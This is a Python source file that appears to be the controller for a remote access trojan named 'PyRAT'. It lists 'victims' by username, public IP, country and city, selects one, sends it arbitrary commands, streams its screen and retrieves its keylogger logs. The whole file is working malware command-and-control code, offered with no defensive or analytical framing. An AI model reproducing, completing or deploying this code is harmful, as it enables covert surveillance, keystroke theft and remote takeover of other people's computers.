from threading import Thread

from stream.stream import Stream
from server import Server
from keylogger import get_send_log
from cfg import cfg


class Handler:
    def __init__(self):
        self.victim_index = None  # Current victim index ( All victims stored in Server.victims )

    def handle(self, srv: Server):
        while True:
            if not srv.victims:
                continue

            try:
                victim = ''

                if self.victim_index is not None:
                    info = srv.victims[self.victim_index].info
                    victim = f'[{info['username']}@{info['public_ip']}] '

                command = input(f'{victim}PyRAT> ')
            except EOFError:
                srv.stop()
                break

            if not command:
                continue

            if command.split()[0] == 'exit':
                if self.victim_index is not None:
                    self.victim_index = None
                    print('Exited...')
                else:
                    print('You\'re already exited')

            elif self.victim_index is not None:
                try:
                    if command == 'stream':
                        srv.send_to_victim(self.victim_index, command)

                        stream = Stream()
                        thread = Thread(target=stream.receive,
                                        args=[cfg.local_ip, cfg.local_data_port])
                        thread.start()
                        continue

                    elif command == 'log':
                        srv.send_to_victim(self.victim_index, command)

                        log = get_send_log.Log()
                        thread = Thread(target=log.get_log,
                                        args=[srv.victims[self.victim_index].info, cfg.local_ip, cfg.local_data_port])
                        thread.start()
                        continue


                    else:
                        srv.send_to_victim(self.victim_index, command)
                        ans = srv.get_from_victim(self.victim_index)

                        if ans.strip():
                            print(ans)
                except ConnectionError as e:
                    print(e)
                    continue

            elif command == 'victims':
                for i in range(len(srv.victims)):
                    info = srv.victims[i].info
                    print(f'[{i}]: {info['username']}@{info['public_ip']} {info['country']} {info['city']}')

            elif command.split()[0] == 'use':
                try:
                    self.victim_index = int(command.split()[1])
                except IndexError:
                    print('Victim not found!')

            elif command.split()[0] == 'info':
                try:
                    index = int(command.split()[1])
                    print(srv.victims[index].info)
                except IndexError:
                    print('Victim not found!')

            else:
                print('Unknown command!')
